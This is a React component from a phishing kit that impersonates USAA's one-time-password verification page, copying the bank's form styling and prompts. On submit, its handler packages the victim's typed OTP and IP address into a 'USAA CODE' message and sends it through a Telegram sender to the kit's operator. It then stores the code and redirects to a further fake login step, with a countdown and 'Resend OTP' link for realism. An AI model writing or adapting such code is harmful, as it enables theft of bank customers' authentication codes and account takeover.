import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import CountDown from "../utils/countdown";

export default function Code() {
  const [formInput, setFormInput] = useState<otp>({
    cd: ""
})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

const ipman: ip = cookies.get("ipman");

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true)
    const message = `
    [----+🏦 USAA CODE 🏦+-----]

    IP: ${ipman.ipman}

    CODE: ${formInput.cd}
    
    `;
    await TelegramSend(message)
    cookies.set("code", formInput)
    setIsLoading(false)
    navigate("../login/auth/2", {replace:true})
    
}

const [countDownIsCompleted, setCountDownIsCompleted] = useState(false)

function handleCountdownComplete () {
  setCountDownIsCompleted(true);
}
  return (
    <>
    <div className="submitForm">
      <p
        className="go-left"
        style={{ fontSize: "14px", marginBottom: "30px" }}
      >
        To verify your identity, Please enter the one time password sent to you. <br />
      </p>

      <form method="post" onSubmit={handleSubmit} aria-busy="false">
        <div className="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
          <div className="usaa-form-v5-10-1-block col-1-1">
            <div>
              <div>
                <label
                  htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                  className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                >
                  <span
                    aria-hidden="false"
                    className="usaa-form-v5-10-1-fieldLabel-text"
                  >
                   Enter OTP
                  </span>
                </label>
              </div>
              <div>
                <div
                  id="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage"
                  className="usaa-form-v5-10-1-fieldWrapper-errorMessage"
                  data-error-message=""
                ></div>
                <div className="screenReader" role="alert"></div>
              </div>
              <span className="usaa-input">
                <input
                onChange={handleInputChange}
                  name="cd"
                  aria-invalid="false"
                  id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                  type="text"
                  aria-describedby="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage undefined"
                  required
                />
                <span className="keyboardFocusRing" aria-hidden="true"></span>
              </span>
            </div>
            <div className="keyboardFocusRing"></div>
          </div>
        </div>

        <div>
          {!countDownIsCompleted ?
<CountDown seconds={480} onComplete={handleCountdownComplete}/>
:
          <p onClick={()=>document.location.reload()} style={{textDecoration:"underline", cursor:"pointer"}}>Resend OTP</p>}
        </div>

      
        {isLoading ?
          <button
          type="button"
          className="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
          id="next-button"
          aria-labelledby="next-button"
        >
          <span>Please wait...</span>
        </button>
          :
          <button
            type="submit"
            className="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
            id="next-button"
            aria-labelledby="next-button"
          >
            <span>Submit</span>
          </button>}
        <div className="help-link">
          <a
            aria-label="I need help logging on. (Opens a pop up)."
            role="link"
          >
            I need help logging on
          </a>
        </div>
      </form>
    </div>
  </>
  );
}
